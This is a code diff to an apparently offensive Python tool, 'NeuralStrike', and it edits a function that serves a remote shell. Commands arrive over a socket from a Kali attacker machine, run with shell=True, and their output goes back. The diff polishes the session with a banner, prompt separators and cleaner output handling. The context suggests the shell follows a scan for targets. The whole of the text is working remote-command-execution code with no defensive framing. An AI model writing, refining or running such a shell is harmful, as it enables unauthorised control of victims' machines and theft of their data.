@@ -68,25 +68,31 @@ def check_dependencies():
 def interactive_shell(s):
     """Handles commands from Kali in a real interactive session."""
     global TARGET_FOUND, BACKGROUND_STATUS
-    s.settimeout(None) # Disable the scanner's 0.7s timeout for the shell sesson
+    s.settimeout(None) 
+    
+    # 1. Send Initial Success Message
+    s.sendall(b"[*] Link Established. Welcome to the NeuralStrike Master Console.\n")
+    
     while True:
         try:
-            # Send prompt
-            s.send(f"\n{os.getcwd()}> ".encode())
-            command = s.recv(1024).decode().strip()
+            # 2. Send the Prompt with a clear separator
+            prompt = f"\n{os.getcwd()}> |||SEP|||"
+            s.sendall(prompt.encode())
             
+            # 3. Wait for Command
+            command = s.recv(1024).decode().strip()
             if not command or command.lower() == "exit":
                 break
             
-            # Execute command
+            # 4. Execute and Send Output
             try:
                 output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-                if not output: output = b"[Command executed with no output]"
-                s.sendall(output)
+                if not output: output = b"[Done]"
+                s.sendall(output + b"\n")
             except subprocess.CalledProcessError as e:
-                s.sendall(f"Command Error: {e.output.decode()}".encode())
+                s.sendall(e.output + b"\n")
             except Exception as e:
-                s.sendall(f"System Error: {str(e)}".encode())
+                s.sendall(f"System Error: {str(e)}\n".encode())
                 
         except (ConnectionResetError, BrokenPipeError):
             break
